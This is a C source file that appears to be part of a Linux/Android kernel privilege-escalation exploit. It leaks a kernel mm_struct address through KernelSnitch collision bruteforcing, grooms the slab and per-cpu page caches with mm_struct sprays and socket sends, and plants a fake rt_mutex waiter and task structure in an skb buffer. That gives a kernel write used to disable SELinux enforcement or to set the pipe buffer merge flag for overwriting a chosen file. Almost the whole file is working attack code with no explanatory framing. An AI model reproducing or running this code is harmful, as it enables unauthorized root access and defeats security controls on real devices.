#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static size_t mm_objs_per_slab;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_pipe_flag;

int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

int is_selinux_enforcing(void) {
  char enforce[32];
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  return atoi(enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static uintptr_t g_p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
static int g_p0_inited;

const char *pipe_overwrite_target(void) {
  const char *t = getenv("PIPE_OVERWRITE_TARGET");
  if (t && *t) {
    return t;
  }
  return PIPE_OVERWRITE_TARGET;
}

void init_p0_from_env(void) {
  if (g_p0_inited) {
    return;
  }
  g_p0_inited = 1;
  const char *arg = getenv("P0_KERNEL_PHYS_LOAD");
  if (!arg || !*arg) {
    return;
  }
  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(arg, &end, 0);
  if (errno || end == arg || *end || value < 0x80000000ULL ||
      value > 0xf0000000ULL || (value & 0xfffffULL) != 0) {
    pr_error("invalid P0_KERNEL_PHYS_LOAD=%s\n", arg);
    return;
  }
  g_p0_kernel_phys_load = (uintptr_t)value;
  pr_info("P0_KERNEL_PHYS_LOAD override=%08zx\n", g_p0_kernel_phys_load);
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  init_p0_from_env();
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = g_p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr) + kaslr_slide;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(struct kernelsnitch_shared_state *ks_ptr) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks_ptr);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}


void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_pipe_flag = payload_base + PIPE_FLAG_OFF;

  uintptr_t write_pc = 0;
  uintptr_t write_right = 0;
  uintptr_t write_left = 0;

  if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
    write_pc = fake_pipe_flag + PIPE_BUF_FLAG_CAN_MERGE | 1;
    write_right = pipebuf_page_base + PIPE_BUFFER_FLAGS_OFF;
    pr_info("Pipe flag payload: fake_pipe_flag=%016zx pipebuf_page_base=%016zx write_right=%016zx\n",
            fake_pipe_flag, pipebuf_page_base, write_right);
  } else {
    write_pc    = data_addr(SELINUX_ENFORCING) - 8;
#ifdef ANDROID_TARGET
    write_right = base + 0x100; // selinux.initialzied = 1
#else
    write_right = 0; // selinux.initialized = 0
#endif
    pr_info("Selinux payload: target=%016zx write_pc=%016zx slide=%016zx\n",
            data_addr(SELINUX_ENFORCING), write_pc, kaslr_slide);
  }

  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);

  unsigned char *p = skb_buf + SKB_FRAG_BIAS;

  put64(p, LOCK_OFF + 0x08, fake_w0);
  put64(p, LOCK_OFF + 0x10, fake_w0);
  put64(p, LOCK_OFF + 0x18, fake_task | 1);

  put64(p, W0_OFF + 0x00, 1);
  put64(p, W0_OFF + 0x08, 0);
  put64(p, W0_OFF + 0x10, 0);
  put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
  put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
  put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
  put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
  put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);

  put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  }
  put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

  memcpy(skb_buf + ORDER3_SIZE, skb_buf, ORDER3_SIZE);
  return 1;
}

/*
 * Shared mm_struct spray + KernelSnitch collision-finding helper.
 *
 * Allocates spray/pre/post mm_ctx objects (via clone_memfd — immediate kill,
 * open /proc/pid/mem to keep mm_struct alive), sets up KernelSnitch, waits
 * for collision finding to complete, then does PCP shaping (sends buf over a
 * temporary socketpair to shape the CPU's per-cpu-page cache, then frees it).
 *
 * On success: returns 1.  s->ks holds the live KernelSnitch state.
 *             s->leak_memfd is open — caller must close it to free the leaked
 *             mm_struct's slab page.
 * On failure: returns 0.  s->ks is cleaned up, s->leak_memfd is closed.
 *             ctx storage is also freed.
 */
int ks_spray_collisions(struct ks_spray_state *s, size_t objs_per_slab,
                         int mm_partials) {
  memset(s, 0, sizeof(*s));
  s->objs_per_slab = objs_per_slab;
  s->leak_memfd = -1;

  init_ctx(&s->pre,   objs_per_slab - 1);
  init_ctx(&s->post,  objs_per_slab);
  init_ctx(&s->spray, (1 + mm_partials) * objs_per_slab);

  for (size_t i = 0; i < s->spray.mm_cnt; i++) {
    s->spray.childs[i] = -1;
    s->spray.memfds[i] = clone_memfd();
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  s->ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);

  for (size_t i = 0; i < s->pre.mm_cnt; i++) {
    s->pre.childs[i] = -1;
    s->pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child(s->ks);
  for (size_t i = 0; i < s->post.mm_cnt; i++) {
    s->post.childs[i] = -1;
    s->post.memfds[i] = clone_memfd();
  }
  s->leak_memfd = open_memfd(leak_child);

  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_found_collisions(s->ks)) {
    kernelsnitch_cleanup(s->ks);
    s->ks = NULL;
    close(s->leak_memfd); s->leak_memfd = -1;
    close_ctx_memfds(&s->pre);
    close_ctx_memfds(&s->post);
    close_ctx_memfds(&s->spray);
    free_ctx_storage(&s->pre);
    free_ctx_storage(&s->post);
    free_ctx_storage(&s->spray);
    return 0;
  }
  return 1;
}

/*
 * PCP shaping + selective memfd close.
 *
 * Sends buf over a temporary socketpair to shape the CPU's per-cpu-page cache,
 * then closes the selective set of spray/pre/post memfds (all pre, all-but-last
 * post, every objs_per_slab-th spray).  Remaining memfds are left open as
 * slab-page fenceposts; the caller (or process exit) closes them.
 */
void ks_spray_pcp_shape(struct ks_spray_state *s, unsigned char *buf) {
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov = { buf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);
  sched_yield(); sched_yield(); sched_yield(); sched_yield();

  for (size_t i = 0; i < s->pre.mm_cnt; i++)
    SYSCHK(close(s->pre.memfds[i]));
  for (size_t i = 0; i < s->post.mm_cnt - 1; i++)
    SYSCHK(close(s->post.memfds[i]));
  for (size_t i = 0; i < s->spray.mm_cnt; i += s->objs_per_slab)
    SYSCHK(close(s->spray.memfds[i]));

  SYSCHK(close(pcp_sv[0])); SYSCHK(close(pcp_sv[1]));
  sched_yield(); sched_yield(); sched_yield(); sched_yield();
}

/* Run KernelSnitch bruteforce and return the leaked mm_struct virtual address.
 * May be called before or after the caller's reclaim — result is deterministic.
 * Returns (uintptr_t)-1 on failure.  Cleans up s->ks. */
uintptr_t ks_spray_result(struct ks_spray_state *s) {
  kernelsnitch_bruteforce(s->ks);
  uintptr_t leaked = kernelsnitch_cleanup(s->ks);
  s->ks = NULL;
  return leaked;
}

static void cleanup_prepare_ctx(struct mm_ctx *ctx) {
  close_ctx_memfds(ctx);
  free_ctx_storage(ctx);
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_warning("SKB malloc failed\n");
    return 0;
  }
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  struct mm_ctx prepare_ctx;
  init_ctx(&prepare_ctx, 32 * mm_objs_per_slab);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = -1;
    prepare_ctx.memfds[i] = clone_memfd();
  }

  struct ks_spray_state s;
  if (!ks_spray_collisions(&s, mm_objs_per_slab, MM_PARTIALS)) {
    pr_warning("KernelSnitch collision finding failed\n");
    cleanup_prepare_ctx(&prepare_ctx);
    free(skb_buf); skb_buf = NULL;
    return 0;
  }

  /* Bruteforce while the leaked mm_struct is still alive. */
  uintptr_t leaked = ks_spray_result(&s);
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    cleanup_prepare_ctx(&prepare_ctx);
    free(skb_buf); skb_buf = NULL;
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    cleanup_prepare_ctx(&prepare_ctx);
    free(skb_buf); skb_buf = NULL;
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  {
    int sndbuf = 1 << 20;
    setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
    if (reclaim_flags >= 0)
      fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }

  ks_spray_pcp_shape(&s, skb_buf);

  {
    struct iovec iov = { skb_buf, SKB_SEND_SIZE };
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    SYSCHK(close(s.leak_memfd));
    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
      if (sent <= 0)
        break;
    }
  }

  cleanup_prepare_ctx(&prepare_ctx);
  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = SELINUX_KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
    max_attempts = PIPE_FLAG_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}
